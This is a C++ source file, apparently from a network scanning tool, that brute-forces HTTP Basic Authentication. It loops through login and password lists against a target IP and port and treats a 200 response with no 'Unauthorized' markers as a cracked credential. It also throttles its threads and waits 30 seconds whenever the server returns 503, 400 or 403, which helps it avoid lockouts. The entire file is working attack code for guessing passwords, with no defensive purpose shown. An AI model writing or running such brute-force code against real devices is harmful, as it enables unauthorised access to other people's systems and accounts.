#include "BasicAuth.h"

bool BA::checkOutput(const string *buffer, const char *ip, const int port) {
    if((Utils::ci_find_substr(*buffer, "200 ok") != -1 ||
            Utils::ci_find_substr(*buffer, "http/1.0 200") != -1 ||
			Utils::ci_find_substr(*buffer, "http/1.1 200") != -1)
			&& Utils::ci_find_substr(*buffer, "http/1.1 401 ") == -1
			&& Utils::ci_find_substr(*buffer, "http/1.0 401 ") == -1
			&& Utils::ci_find_substr(*buffer, "<statusValue>401</statusValue>") == -1
			&& Utils::ci_find_substr(*buffer, "<statusString>Unauthorized</statusString>") == -1
			&& Utils::ci_find_substr(*buffer, "íåïðàâèëüíû") == -1
			&& Utils::ci_find_substr(*buffer, "ÐÐµÐ¿Ñ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ñ‹") == -1
            ) {
        return true;
	}
	else if (Utils::ci_find_substr(*buffer, "503 service unavailable") != -1
		|| Utils::ci_find_substr(*buffer, "http/1.1 503") != -1
		|| Utils::ci_find_substr(*buffer, "http/1.0 503") != -1
		|| Utils::ci_find_substr(*buffer, "400 BAD_REQUEST") != -1
		|| Utils::ci_find_substr(*buffer, "400 bad request") != -1
		|| Utils::ci_find_substr(*buffer, "403 Forbidden") != -1
		)
	{
		stt->doEmition_BARedData("[.] 503/400/403 - Waiting 30sec (" + QString(ip) + ":" + QString::number(port) + ")");

		Sleep(30000);
	}

    return false;
}

lopaStr BA::BABrute(const char *ip, const int port) {
    string buffer;
    string lpString;
    lopaStr lps;
    ZeroMemory(lps.login, sizeof(lps.login));
    ZeroMemory(lps.pass, sizeof(lps.pass));
    ZeroMemory(lps.other, sizeof(lps.other));
	int passCounter = 0;

    strcpy(lps.login, "UNKNOWN");

    for(int i = 0; i < MaxLogin; ++i) {
        for (int j = 0; j < MaxPass; ++j) {
            if (!globalScanFlag) return lps;

            lpString = string(loginLst[i]) + ":" + string(passLst[j]);

			if (Connector::nConnect(ip, port, &buffer, NULL, NULL, &lpString) == -2) return lps;

            if(checkOutput(&buffer, ip, port)) {
                strcpy(lps.login, loginLst[i]);
                strcpy(lps.pass, passLst[j]);
                return lps;
            };

			if (BALogSwitched) stt->doEmitionBAData("FTP: " + QString(ip) + ":" + QString::number(port) + 
				"; l/p: " + QString(loginLst[i]) + ":" + QString(passLst[j]) + ";	- Progress: (" + 
				QString::number((++passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");

            Sleep(100);
        }
    }

    return lps;
}

lopaStr BA::BALobby(const char *ip, const int port) {
    while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

    BruteUtils::BConInc();
    const lopaStr &lps = BABrute(ip, port);
    BruteUtils::BConDec();

    return lps;
}
